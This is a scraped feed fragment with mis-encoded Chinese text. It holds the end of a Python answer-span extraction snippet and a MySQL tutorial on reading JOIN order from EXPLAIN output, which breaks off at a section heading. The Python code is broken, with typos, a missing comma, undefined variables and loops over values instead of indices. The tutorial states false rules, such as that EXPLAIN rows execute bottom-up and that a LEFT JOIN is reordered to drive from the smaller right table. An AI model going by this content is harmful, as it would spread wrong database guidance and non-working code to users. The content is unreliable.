Â  Â  Â  Â  question, context, <span class="hljs-attr">max_length</span>=<span class="hljs-number">384</span>,  
Â  Â  Â  Â  <span class="hljs-attr">truncation</span>=<span class="hljs-string">"only_second"</span>,  
Â  Â  Â  Â  <span class="hljs-attr">return_offsets_mapping</span>=<span class="hljs-literal">True</span>,  
Â  Â  Â  Â  <span class="hljs-attr">return_overflowing_tokens</span>=Ture  
Â  Â  Â  Â  <span class="hljs-attr">stride</span>=<span class="hljs-number">100</span>,  
Â  Â  Â  Â  <span class="hljs-attr">padding</span>=<span class="hljs-string">"max_length"</span>  
Â  Â  )  
  
Â  Â Â <span class="hljs-comment"># 2. æ¨¡å‹å‰å‘ä¼ æ’­  </span>
Â  Â Â withÂ torch.no_grad():  
Â  Â  Â  Â  <span class="hljs-attr">outputs</span> = model(**inputs)  
Â  Â Â   
Â  Â  <span class="hljs-attr">transform_res</span> = []  
Â  Â  <span class="hljs-attr">start_logits</span> = outputs.start_logits.cpu().numpy()  
Â  Â  <span class="hljs-attr">end_logits</span> = outputs.end_logits.cpu().numpy()  
Â  Â Â   
Â  Â  <span class="hljs-attr">logits_size</span> = start_logits.shape[<span class="hljs-number">0</span>]  
Â  Â Â forÂ feature_idxÂ inÂ range(logits_size):  
Â  Â Â   
Â  Â  Â  Â  <span class="hljs-attr">sample_idx</span> = inputs[<span class="hljs-string">"overflow_to_sample_mapping"</span>][feature_idx]  
Â  Â  Â  Â  <span class="hljs-attr">offset</span> = inputs[<span class="hljs-string">"offset_mappings"</span>][feature_idx]  
Â  Â  Â  Â  <span class="hljs-attr">start_logit</span> = start_logits[feature_idx]  
Â  Â  Â  Â  <span class="hljs-attr">end_logit</span> = end_logits[feature_idx]  
Â  Â  Â  Â  <span class="hljs-attr">sequence_ids</span> = inputs.sequence_ids(feature_idx)  
Â  Â  Â  Â Â   
Â  Â  Â  Â  Â forÂ start_idxÂ inÂ start_logit:  
Â  Â  Â  Â  Â  Â Â forÂ end_idxÂ inÂ end_logit:  
Â  Â  Â  Â  Â  Â  Â  Â Â ifÂ start_idx &gt; end_idx:  
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â continue  
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â   
Â  Â  Â  Â  Â  Â  Â  Â Â ifÂ sequence_ids<span class="hljs-section">[start_idx]</span> ==Â 0Â andÂ sequence_ids<span class="hljs-section">[end_idx]</span> ==Â 0:  
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â continue  
Â  Â  Â  Â  Â  Â  Â  Â Â   
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">start_token</span> = <span class="hljs-literal">off</span>set[start_idx][<span class="hljs-number">0</span>]  
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">end_token</span> = <span class="hljs-literal">off</span>set[end_idx][<span class="hljs-number">1</span>]  
Â  Â  Â  Â  Â  Â  Â  Â Â   
Â  Â  Â  Â  Â  Â  Â  Â Â ifÂ <span class="hljs-attr">start_token</span> ==Â <span class="hljs-number">0</span>Â andÂ end_token ==Â <span class="hljs-number">0</span>:  
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â continue  
Â  Â  Â  Â  Â  Â  Â  Â Â ifÂ end_token &lt; start_token:  
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â continue  
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">ans_from_ctx</span> = context[start_token:end_token]  
Â  Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-comment"># ä»åŸå§‹logitsä¸­å–  </span>
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">scroe</span> = start_logits[logit_idx][start_idx] + end_logits[logit_idx][end]  
Â  Â  Â  Â  Â  Â  Â  Â  transform_res.append(  
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  {  
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â "answer": ans_from_ctx,  
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â "score": scroe,  
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â "start_token": start_token,  
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â "end_token": end_token,  
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  }  
Â  Â  Â  Â  Â  Â  Â  Â  )  
Â  Â Â returnÂ transform_res
</code></pre>
<p>å¦‚æœä½ æƒ³æ›´æ·±å…¥åœ°å­¦ä¹ å¤§æ¨¡å‹ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›éå¸¸æœ‰ä»·å€¼çš„å­¦ä¹ èµ„æºï¼Œè¿™äº›èµ„æºå°†å¸®åŠ©ä½ ä»ä¸åŒè§’åº¦å­¦ä¹ å¤§æ¨¡å‹ï¼Œæå‡ä½ çš„å®è·µèƒ½åŠ›ã€‚</p>
<blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">è¿™é‡Œ</a>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQL EXPLAIN æ‰§è¡Œè®¡åˆ’åˆ†æï¼šèƒ½å¦æŸ¥çœ‹ JOIN å…³è”é¡ºåº]]></title>    <link>https://juejin.cn/post/7588570963294453803</link>    <guid>https://juejin.cn/post/7588570963294453803</guid>    <pubDate>2025-12-29T05:18:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588570963294453803" data-draft-id="7588411503122366500" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQL EXPLAIN æ‰§è¡Œè®¡åˆ’åˆ†æï¼šèƒ½å¦æŸ¥çœ‹ JOIN å…³è”é¡ºåº"/> <meta itemprop="keywords" content="åç«¯,æ•°æ®åº“,MySQL"/> <meta itemprop="datePublished" content="2025-12-29T05:18:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Cosolar"/> <meta itemprop="url" content="https://juejin.cn/user/184373686834391"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQL EXPLAIN æ‰§è¡Œè®¡åˆ’åˆ†æï¼šèƒ½å¦æŸ¥çœ‹ JOIN å…³è”é¡ºåº
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/184373686834391/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Cosolar
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T05:18:09.000Z" title="Mon Dec 29 2025 05:18:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ ä»¬çŸ¥é“ <code>EXPLAIN</code> æ˜¯å¦èƒ½çœ‹å‡º MySQL çš„ JOIN å…³è”é¡ºåºï¼Ÿ ç»“è®ºæ˜¯ï¼š<strong>å®Œå…¨å¯ä»¥</strong>ï¼Œè€Œä¸” <code>EXPLAIN</code> æ˜¯æŸ¥çœ‹ã€åˆ†æ MySQL JOIN å…³è”é¡ºåºçš„<strong>æ ¸å¿ƒã€æœ€å¸¸ç”¨æ‰‹æ®µ</strong>ï¼Œæ²¡æœ‰ä¹‹ä¸€ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€æ ¸å¿ƒç»“è®ºï¼šEXPLAIN ä¸­ JOIN å…³è”é¡ºåºçš„æ ¸å¿ƒè§„åˆ™</h2>
<h3 data-id="heading-1">âœ… è§„åˆ™1ï¼š<code>EXPLAIN</code> ç»“æœçš„<strong>è¡Œå±•ç¤ºé¡ºåº</strong> = MySQL å®é™…æ‰§è¡Œçš„ JOIN å…³è”é¡ºåº</h3>
<p><code>EXPLAIN</code> æ‰§è¡Œåä¼šè¿”å›ä¸€ä¸ªç»“æœé›†ï¼ˆå¤šè¡Œæ•°æ®ï¼‰ï¼Œ<strong>MySQL æ˜¯ã€Œä»ä¸‹å¾€ä¸Šã€æ‰§è¡Œ JOIN å…³è”</strong>çš„ï¼Œè¿™ä¸ªé¡ºåºæ˜¯ç»å¯¹çš„æ ¸å¿ƒï¼Œè®°ä½è¿™ä¸ªå£è¯€ï¼š</p>
<p><code>EXPLAIN</code> ç»“æœ<strong>è¶Šé åçš„è¡Œ</strong>ï¼Œæ˜¯ MySQL æ‰§è¡Œ JOIN æ—¶<strong>å…ˆè®¿é—®çš„è¡¨</strong>ï¼ˆé©±åŠ¨è¡¨ï¼‰ï¼›</p>
<p><code>EXPLAIN</code> ç»“æœ<strong>è¶Šé å‰çš„è¡Œ</strong>ï¼Œæ˜¯ MySQL æ‰§è¡Œ JOIN æ—¶<strong>åè®¿é—®çš„è¡¨</strong>ï¼ˆè¢«é©±åŠ¨è¡¨ï¼‰ã€‚</p>
<h3 data-id="heading-2">âœ… è§„åˆ™2ï¼šé©±åŠ¨è¡¨ &amp; è¢«é©±åŠ¨è¡¨çš„å®šä¹‰ï¼ˆç†è§£å…³è”é¡ºåºçš„å‰æï¼‰</h3>
<ul>
<li><strong>é©±åŠ¨è¡¨ (driving table)</strong> ï¼šJOIN å…³è”æ—¶<strong>å…ˆè¢«åŠ è½½ã€å…ˆè¢«æ‰«æ</strong>çš„è¡¨ï¼ŒMySQL ä¼šç”¨é©±åŠ¨è¡¨çš„æ¯æ¡æ•°æ®ï¼Œå»åŒ¹é…å¦ä¸€å¼ è¡¨çš„æ•°æ®ï¼›</li>
<li><strong>è¢«é©±åŠ¨è¡¨ (driven table)</strong> ï¼šJOIN å…³è”æ—¶<strong>åè¢«åŠ è½½ã€è¢«åŒ¹é…</strong>çš„è¡¨ï¼Œä¹Ÿå«ã€ŒåŒ¹é…è¡¨ã€ï¼›</li>
<li>é©±åŠ¨è¡¨çš„é€‰æ‹©ï¼Œæ˜¯ MySQL ä¼˜åŒ–å™¨çš„æ ¸å¿ƒé€»è¾‘ä¹‹ä¸€ï¼Œ<strong>å°è¡¨ï¼ˆæ•°æ®é‡å°‘ã€è¿‡æ»¤åç»“æœé›†å°ï¼‰ä¼˜å…ˆä½œä¸ºé©±åŠ¨è¡¨</strong>ï¼Œè¿™æ˜¯æœ€ä¼˜çš„ JOIN æ‰§è¡Œç­–ç•¥ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-3">äºŒã€æœ€ç›´è§‚æ¡ˆä¾‹ï¼šä¸€çœ¼çœ‹æ‡‚ JOIN å…³è”é¡ºåº</h2>
<h3 data-id="heading-4">æ¡ˆä¾‹è¡¨å‡†å¤‡</h3>
<p>æœ‰ä¸¤å¼ å¸¸è§ä¸šåŠ¡è¡¨ï¼Œåš JOIN æŸ¥è¯¢ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- è®¢å•è¡¨ï¼ˆæ•°æ®é‡è¾ƒå¤§ï¼Œå‡è®¾10ä¸‡æ¡ï¼‰</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `<span class="hljs-keyword">order</span>` (
  id <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY</span> KEY,
  user_id <span class="hljs-type">INT</span>,
  order_no <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32</span>),
  KEY idx_user_id (user_id)
);
<span class="hljs-comment">-- ç”¨æˆ·è¡¨ï¼ˆæ•°æ®é‡è¾ƒå°ï¼Œå‡è®¾1ä¸‡æ¡ï¼‰</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `<span class="hljs-keyword">user</span>` (
  id <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY</span> KEY,
  name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32</span>),
  age <span class="hljs-type">INT</span>
);
</code></pre>
<h3 data-id="heading-5">æ‰§è¡Œ JOIN æŸ¥è¯¢+EXPLAIN</h3>
<pre><code class="hljs language-sql" lang="sql">EXPLAIN <span class="hljs-keyword">SELECT</span> o.<span class="hljs-operator">*</span>, u.name <span class="hljs-keyword">FROM</span> `<span class="hljs-keyword">order</span>` o <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> `<span class="hljs-keyword">user</span>` u <span class="hljs-keyword">ON</span> o.user_id <span class="hljs-operator">=</span> u.id;
</code></pre>
<h3 data-id="heading-6"><code>EXPLAIN</code> ç»“æœï¼ˆæ ¸å¿ƒå…³æ³¨ <code>table</code> åˆ—ï¼‰</h3>
<p>å‡è®¾ <code>EXPLAIN</code> è¿”å› <strong>2è¡Œç»“æœ</strong>ï¼Œ<code>table</code> åˆ—å±•ç¤ºå¦‚ä¸‹ï¼š</p>


























<table><thead><tr><th>id</th><th>select_type</th><th>table</th><th>type</th><th>...</th></tr></thead><tbody><tr><td>1</td><td>SIMPLE</td><td>o</td><td>ALL</td><td>...</td></tr><tr><td>1</td><td>SIMPLE</td><td>u</td><td>ref</td><td>...</td></tr></tbody></table>
<h3 data-id="heading-7">å…³è”é¡ºåºè§£è¯»</h3>
<p><code>EXPLAIN</code> ç»“æœé‡Œï¼Œè¡Œ1æ˜¯è¡¨ <code>o</code>ï¼ˆorderï¼‰ã€è¡Œ2æ˜¯è¡¨ <code>u</code>ï¼ˆuserï¼‰ï¼Œæ ¹æ®ã€Œ<strong>ä»ä¸‹å¾€ä¸Šæ‰§è¡Œ</strong>ã€çš„è§„åˆ™ï¼š</p>
<p>âœ… MySQL å®é™…æ‰§è¡Œé¡ºåºï¼š<strong>å…ˆæŸ¥ user è¡¨ï¼ˆé©±åŠ¨è¡¨ï¼‰ â†’ å†æŸ¥ order è¡¨ï¼ˆè¢«é©±åŠ¨è¡¨ï¼‰</strong></p>
<p>è¡¥å……ï¼šå“ªæ€•ä½ å†™çš„æ˜¯ <code>order LEFT JOIN user</code>ï¼ŒMySQL ä¼˜åŒ–å™¨ä¼šè‡ªåŠ¨è°ƒæ•´é¡ºåºï¼Œå› ä¸º user æ˜¯å°è¡¨ï¼Œåšé©±åŠ¨è¡¨æ•ˆç‡æ›´é«˜ï¼</p>
<hr/>
<h2 data-id="heading-8">ä¸‰ã€EXPLAIN ä¸­åˆ¤æ–­ JOIN çš„ä¸¤ä¸ªæ ¸å¿ƒå…³é”®å­—æ®µï¼ˆå¿…çœ‹ï¼‰</h2>
<p><code>EXPLAIN</code> çš„ç»“æœæœ‰å¾ˆå¤šåˆ—ï¼Œ<strong>åˆ¤æ–­æ˜¯å¦æ˜¯ JOIN æŸ¥è¯¢ã€ä»¥åŠ JOIN å…³è”çš„åŒ¹é…æ–¹å¼</strong>ï¼Œåªéœ€è¦é‡ç‚¹çœ‹ 2 ä¸ªå…³é”®å­—æ®µï¼Œç¼ºä¸€ä¸å¯ï¼š</p>
<h3 data-id="heading-9">âœ… å­—æ®µ1ï¼š<code>type</code> åˆ— - å…³è”åŒ¹é…çš„ã€Œè®¿é—®ç±»å‹ã€</h3>
<p><code>type</code> åˆ—ä»£è¡¨ MySQL å¯¹è¡¨çš„<strong>è®¿é—®/åŒ¹é…æ–¹å¼</strong>ï¼Œ<strong>åªè¦æ˜¯ JOIN æŸ¥è¯¢ï¼Œè¢«é©±åŠ¨è¡¨çš„ type å­—æ®µä¸€å®šä¼šå‡ºç°</strong> <strong><code>ref</code></strong> <strong>/</strong> <strong><code>eq_ref</code></strong> <strong>è¿™ä¸¤ä¸ªå€¼ä¹‹ä¸€</strong>ï¼Œè¿™æ˜¯ JOIN çš„ã€Œèº«ä»½æ ‡è¯†ã€ã€‚</p>
<ul>
<li><code>eq_ref</code>ï¼šæœ€ä¼˜çš„ JOIN åŒ¹é…ï¼Œ<strong>ä¸€å¯¹ä¸€</strong>åŒ¹é…ï¼ˆæ¯”å¦‚å…³è”ä¸»é”®/å”¯ä¸€ç´¢å¼•ï¼‰ï¼Œæ€§èƒ½æé«˜ï¼›</li>
<li><code>ref</code>ï¼šéå¸¸å¥½çš„ JOIN åŒ¹é…ï¼Œ<strong>å¤šå¯¹ä¸€</strong>åŒ¹é…ï¼ˆæ¯”å¦‚å…³è”æ™®é€šç´¢å¼•ï¼‰ï¼Œæ€§èƒ½ä¹Ÿå¾ˆå¥½ï¼›</li>
</ul>
<p>è¡¥å……ï¼šå¦‚æœ JOIN çš„è¢«é©±åŠ¨è¡¨ <code>type</code> æ˜¯ <code>ALL</code>ï¼Œè¯´æ˜æ˜¯ã€Œç¬›å¡å°”ç§¯åŒ¹é…/å…¨è¡¨æ‰«æåŒ¹é…ã€ï¼Œæ˜¯æ€§èƒ½æå·®çš„ JOINï¼Œå¿…é¡»ä¼˜åŒ–ï¼ˆåŠ ç´¢å¼•ï¼‰ã€‚</p>
<h3 data-id="heading-10">âœ… å­—æ®µ2ï¼š<code>possible_keys</code>/<code>key</code> åˆ— - JOIN ç”¨çš„ç´¢å¼•</h3>
<ul>
<li><code>possible_keys</code>ï¼šMySQL è®¤ä¸º<strong>å¯ä»¥ç”¨æ¥åš JOIN å…³è”</strong>çš„ç´¢å¼•ï¼ˆå€™é€‰ç´¢å¼•ï¼‰ï¼›</li>
<li><code>key</code>ï¼šMySQL æœ€ç»ˆ<strong>å®é™…é€‰ç”¨çš„ JOIN å…³è”ç´¢å¼•</strong>ï¼ˆæ ¸å¿ƒå­—æ®µï¼‰ï¼›</li>
</ul>
<p>å…³é”®ä¼˜åŒ–ç‚¹ï¼šå¦‚æœ JOIN æŸ¥è¯¢çš„ <code>key</code> åˆ—æ˜¯ <code>NULL</code>ï¼Œè¯´æ˜ MySQL æ²¡æœ‰ç”¨åˆ°ä»»ä½•ç´¢å¼•åšå…³è”ï¼Œå°±æ˜¯ä¸Šé¢è¯´çš„ã€Œå…¨è¡¨æ‰«æ JOINã€ï¼Œä¸€å®šè¦ç»™ JOIN çš„å…³è”å­—æ®µï¼ˆå¦‚ <code>o.user_id</code>/<code>u.id</code>ï¼‰åŠ ç´¢å¼•ã€‚</p>
<hr/>
<h2 data-id="heading-11">å››ã€å¤šè¡¨ JOIN åœºæ™¯ï¼š3è¡¨/å¤šè¡¨çš„å…³è”é¡ºåºæ€ä¹ˆçœ‹ï¼Ÿ</h2>
<p>å¦‚æœæ˜¯ 3 å¼ åŠä»¥ä¸Šè¡¨çš„ JOINï¼Œè§„åˆ™<strong>å®Œå…¨ä¸å˜</strong>ï¼Œè¿˜æ˜¯éµå¾ªï¼š</p>
<p><code>EXPLAIN</code> ç»“æœ <strong>ä»ä¸‹å¾€ä¸Š</strong> æ‰§è¡Œï¼Œ<strong>åè¡Œ = å…ˆè¡Œæ‰§è¡Œï¼ˆé©±åŠ¨è¡¨ï¼‰ï¼Œå‰è¡Œ = åæ‰§è¡Œï¼ˆè¢«é©±åŠ¨è¡¨ï¼‰</strong></p>
<h3 data-id="heading-12">æ¡ˆä¾‹ï¼š3è¡¨ JOIN</h3>
<pre><code class="hljs language-sql" lang="sql">EXPLAIN <span class="hljs-keyword">SELECT</span> o.<span class="hljs-operator">*</span>, u.name, g.goods_name 
<span class="hljs-keyword">FROM</span> `<span class="hljs-keyword">order</span>` o 
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> `<span class="hljs-keyword">user</span>` u <span class="hljs-keyword">ON</span> o.user_id <span class="hljs-operator">=</span> u.id
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> `goods` g <span class="hljs-keyword">ON</span> o.goods_id <span class="hljs-operator">=</span> g.id;
</code></pre>
<h3 data-id="heading-13"><code>EXPLAIN</code> ç»“æœï¼ˆtableåˆ—ï¼‰ï¼š3è¡Œ</h3>
<p>è¡Œ1 â†’ table: o</p>
<p>è¡Œ2 â†’ table: g</p>
<p>è¡Œ3 â†’ table: u</p>
<h3 data-id="heading-14">å®é™…æ‰§è¡Œé¡ºåº</h3>
<p><strong>ç¬¬ä¸€æ­¥</strong>ï¼šå…ˆè®¿é—® <code>u</code> è¡¨ï¼ˆæœ€ä¸‹è¡Œï¼Œé©±åŠ¨è¡¨1ï¼‰</p>
<p><strong>ç¬¬äºŒæ­¥</strong>ï¼šç”¨ <code>u</code> è¡¨çš„æ•°æ®å…³è”è®¿é—® <code>g</code> è¡¨ï¼ˆä¸­é—´è¡Œï¼Œè¢«é©±åŠ¨è¡¨1ã€é©±åŠ¨è¡¨2ï¼‰</p>
<p><strong>ç¬¬ä¸‰æ­¥</strong>ï¼šç”¨ <code>u+g</code> å…³è”çš„ç»“æœï¼Œå…³è”è®¿é—® <code>o</code> è¡¨ï¼ˆæœ€ä¸Šè¡Œï¼Œè¢«é©±åŠ¨è¡¨2ï¼‰</p>
<p>æ€»ç»“ï¼šä¸ç®¡å¤šå°‘è¡¨ JOINï¼Œåªéœ€è¦æŠŠ <code>EXPLAIN</code> çš„ç»“æœè¡Œ<strong>å€’åºçœ‹</strong>ï¼Œå°±æ˜¯å®Œæ•´çš„æ‰§è¡Œé¡ºåºï¼</p>
<hr/>
<h2 data-id="heading-15">äº”ã€MySQL ä¼šä¸ä¼šã€Œè‡ªå·±è°ƒæ•´ JOIN å…³è”é¡ºåºã€ï¼Ÿ</h2>
<h3 data-id="heading-16">âœ… é‡è¦ç»“è®ºï¼š<strong>ä¼šçš„ï¼è€Œä¸”æ˜¯å¸¸æ€ï¼</strong></h3>
<p>ä½ åœ¨ SQL è¯­å¥ä¸­<strong>ä¹¦å†™çš„ JOIN è¡¨é¡ºåº</strong>ï¼Œ<strong>ä¸ç­‰äº</strong> MySQL å®é™…æ‰§è¡Œçš„ JOIN é¡ºåºï¼</p>
<h3 data-id="heading-17">æ ¸å¿ƒåŸå› ï¼šMySQL æœ‰ã€ŒJOIN ä¼˜åŒ–å™¨ï¼ˆå…³è”é¡ºåºä¼˜åŒ–ï¼‰ã€</h3>
<p>MySQL çš„ä¼˜åŒ–å™¨ä¼šåŸºäºã€Œ<strong>æˆæœ¬ä¼°ç®—</strong>ã€ï¼Œè‡ªåŠ¨è°ƒæ•´ JOIN çš„å…³è”é¡ºåºï¼Œæ ¸å¿ƒåŸåˆ™æ˜¯ï¼š</p>
<p><strong>ä¼˜å…ˆé€‰æ‹©ã€Œå°è¡¨/è¿‡æ»¤åç»“æœé›†æœ€å°çš„è¡¨ã€ä½œä¸ºé©±åŠ¨è¡¨</strong></p>
<p>å› ä¸ºé©±åŠ¨è¡¨è¶Šå°ï¼Œéœ€è¦å¾ªç¯åŒ¹é…çš„æ¬¡æ•°è¶Šå°‘ï¼ŒJOIN çš„æ•´ä½“æ‰§è¡Œæ•ˆç‡è¶Šé«˜ã€‚</p>
<p>æ¯”å¦‚ä½ å†™çš„æ˜¯ <code>å¤§è¡¨ JOIN å°è¡¨</code>ï¼ŒMySQL ä¼˜åŒ–å™¨ä¼šè‡ªåŠ¨è°ƒæ•´ä¸º <code>å°è¡¨ JOIN å¤§è¡¨</code>ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸ç”¨åˆ»æ„çº ç»“ SQL ä¸­ JOIN çš„ä¹¦å†™é¡ºåºçš„åŸå› ã€‚</p>
<hr/>
<h2 data-id="heading-18">å…­ã€å¦‚ä½•å¼ºåˆ¶ MySQL æŒ‰ç…§ã€Œæˆ‘å†™çš„é¡ºåºã€æ‰§è¡Œ JOINï¼Ÿ</h2>
